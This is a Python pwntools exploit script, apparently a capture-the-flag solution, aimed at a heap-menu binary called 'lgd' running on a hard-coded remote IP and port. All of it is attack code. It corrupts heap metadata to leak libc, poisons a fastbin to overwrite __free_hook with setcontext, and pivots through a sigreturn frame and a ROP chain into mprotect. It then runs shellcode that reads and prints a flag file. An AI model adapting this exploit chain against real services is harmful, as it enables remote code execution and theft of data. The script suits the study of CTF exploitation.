from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
prog = './lgd'
elf = ELF(prog)
p = process(prog)

libc = ELF("./libc")
p = remote("121.36.209.145",  9998)
def debug(addr,PIE=True): 
	if PIE: 
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16) 
		gdb.attach(p,'b *{}'.format(hex(text_base+addr))) 
	else: gdb.attach(p,"b *{}".format(hex(addr)))
def dbg(b= ''):
    gdb.attach(p, b)
    if b == '':
    	p.interactive()
    	
def add(size, content):
	p.sendlineafter(">> ", '1')
	p.sendlineafter("______?\n", str(size))
	p.sendafter("yes_or_no?\n", content)
def edit(idx, content):
	p.sendlineafter(">> ", '4')
	p.sendlineafter("index ?\n", str(idx))
	p.sendafter("ew_content ?\n", content)
def show(idx):
	p.sendlineafter(">> ", '3')
	p.sendlineafter("index ?\n", str(idx))
def free(idx):
	p.sendlineafter(">> ", '2')
	p.sendlineafter("index ?\n", str(idx))
def exp():
	p.sendlineafter("what is your name?", 'a')
	add(0x20, 'a'*0x80)#0
	add(0x80, 'a'*0x20)#1
	add(0x60, 'a'*0x20)#2
	add(0x20, 'a'*0x20)#3
	edit(0, 'a'*0x20+p64(0)+p64(0x101))
	free(1)
	add(0x80, 'a'*0x100)#1
	show(2)
	libc.address = u64(p.recv(6)+'\x00'*2)-0x7f36a5b50b78+0x7f36a578c000
	log.info("libc.address ==> " + hex(libc.address))
	edit(1, 'a'*0x80+p64(0)+p64(0x71)+p64(0)+p64(libc.sym['__free_hook']-0x40))
	add(0x60, 'a')#4
	free(2)
	edit(1, 'a'*0x80+p64(0)+p64(0x71)+p64(libc.sym['__free_hook']-0x33))
	
	syscall_ret = libc.address + 0xbc375
	bss = 0x603060
	
	frame = SigreturnFrame()
	frame.rdi = 0
	frame.rsi = (libc.symbols['__free_hook']) & 0xfffffffffffff000
	frame.rdx = 0x2000
	frame.rsp = (libc.symbols['__free_hook']) & 0xfffffffffffff000 
	frame.rip = syscall_ret#: syscall; ret; 
	payload = str(frame)
	add(0x60, 'a'*0x80)#2
	edit(2, payload)
	add(0x60, 'a'*80)#5
	edit(5, '\x00'*35 + p64(libc.symbols['setcontext'] + 53))
	#gdb.attach(p)
	free(2)
	pop_rdi = libc.address + 0x21102
	pop_rsi = libc.address + 0x202e8
	pop_rdx = libc.address + 0x1b92
	pop_rax = libc.address + 0x33544
	jmp_rsp = libc.address + 0x2a71
	
	layout = [
    	pop_rdi, #: pop rdi; ret; 
   		(libc.symbols['__free_hook']) & 0xfffffffffffff000,
    	pop_rsi, #: pop rsi; ret; 
    	0x2000,
    	pop_rdx, #: pop rdx; ret; 
    	7,
    	pop_rax, #: pop rax; ret; 
    	10,
    	syscall_ret, #: syscall; ret; 
    	jmp_rsp, #: jmp rsp; 
	]

	shellcode = shellcraft.amd64.open("./flag")
	shellcode += shellcraft.amd64.read(3,bss,0x30)
	shellcode += shellcraft.amd64.write(1,bss,0x30)
	p.send(flat(layout) + asm(shellcode))
	
	
	p.interactive()
if __name__ == '__main__':
	exp()
